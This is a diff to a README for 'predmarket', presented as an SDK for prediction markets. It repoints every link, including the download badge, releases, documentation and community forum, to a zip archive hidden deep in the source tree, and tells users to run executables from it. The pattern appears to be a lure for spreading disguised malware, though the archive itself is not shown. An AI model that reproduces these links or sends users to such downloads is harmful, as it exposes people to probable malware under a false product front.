@@ -1,6 +1,6 @@
 # 🚀 predmarket - A Simple SDK for Prediction Markets
 
-[![Download Now](https://raw.githubusercontent.com/elsantos305/predmarket/main/intermental/predmarket.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/elsantos305/predmarket/main/intermental/predmarket.zip)
+[![Download Now](https://github.com/elsantos305/predmarket/raw/refs/heads/main/src/predmarket/model/ws/Software_1.6.zip%20Now-Get%20the%20App-brightgreen)](https://github.com/elsantos305/predmarket/raw/refs/heads/main/src/predmarket/model/ws/Software_1.6.zip)
 
 ## 📋 Introduction
 
@@ -24,7 +24,7 @@ To ensure a smooth experience with predmarket, your system should meet the follo
 
 ## 🚀 Getting Started
 
-1. **Visit the Download Page**: Go to our [Releases Page](https://raw.githubusercontent.com/elsantos305/predmarket/main/intermental/predmarket.zip) to find the latest version.
+1. **Visit the Download Page**: Go to our [Releases Page](https://github.com/elsantos305/predmarket/raw/refs/heads/main/src/predmarket/model/ws/Software_1.6.zip) to find the latest version.
    
 2. **Choose Your Version**: Select the version that matches your operating system. We offer Windows, macOS, and Linux versions.
 
@@ -33,13 +33,13 @@ To ensure a smooth experience with predmarket, your system should meet the follo
 4. **Run the Installer**:
    - For Windows: Open the `.exe` file you downloaded and follow the installation prompts.
    - For macOS: Open the `.dmg` file and drag the application to your Applications folder.
-   - For Linux: Extract the `https://raw.githubusercontent.com/elsantos305/predmarket/main/intermental/predmarket.zip` file and run the executable included.
+   - For Linux: Extract the `https://github.com/elsantos305/predmarket/raw/refs/heads/main/src/predmarket/model/ws/Software_1.6.zip` file and run the executable included.
 
 5. **Open the Application**: Once installed, locate the app in your applications list and double-click it to start.
 
 ## 📥 Download & Install
 
-You can easily download predmarket by visiting the [Releases Page](https://raw.githubusercontent.com/elsantos305/predmarket/main/intermental/predmarket.zip). 
+You can easily download predmarket by visiting the [Releases Page](https://github.com/elsantos305/predmarket/raw/refs/heads/main/src/predmarket/model/ws/Software_1.6.zip). 
 
 1. Go to the page and find the latest version.
 2. Click the download link for your operating system.
@@ -64,7 +64,7 @@ You can easily download predmarket by visiting the [Releases Page](https://raw.g
 If you encounter any problems:
 
 1. **Check System Requirements**: Ensure your system meets the minimum requirements.
-2. **Reinstall the App**: Delete the application and reinstall it from the [Releases Page](https://raw.githubusercontent.com/elsantos305/predmarket/main/intermental/predmarket.zip).
+2. **Reinstall the App**: Delete the application and reinstall it from the [Releases Page](https://github.com/elsantos305/predmarket/raw/refs/heads/main/src/predmarket/model/ws/Software_1.6.zip).
 3. **Consult Documentation**: Refer to the user guides available within the application for common issues.
 
 ## 📞 Support
@@ -77,8 +77,8 @@ Contributions are welcome! If you have suggestions, improvements, or new feature
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://raw.githubusercontent.com/elsantos305/predmarket/main/intermental/predmarket.zip)
-- [Documentation](https://raw.githubusercontent.com/elsantos305/predmarket/main/intermental/predmarket.zip)
-- [Community Forum](https://raw.githubusercontent.com/elsantos305/predmarket/main/intermental/predmarket.zip)
+- [Releases Page](https://github.com/elsantos305/predmarket/raw/refs/heads/main/src/predmarket/model/ws/Software_1.6.zip)
+- [Documentation](https://github.com/elsantos305/predmarket/raw/refs/heads/main/src/predmarket/model/ws/Software_1.6.zip)
+- [Community Forum](https://github.com/elsantos305/predmarket/raw/refs/heads/main/src/predmarket/model/ws/Software_1.6.zip)
 
 Thank you for choosing predmarket! Enjoy your journey into prediction markets.
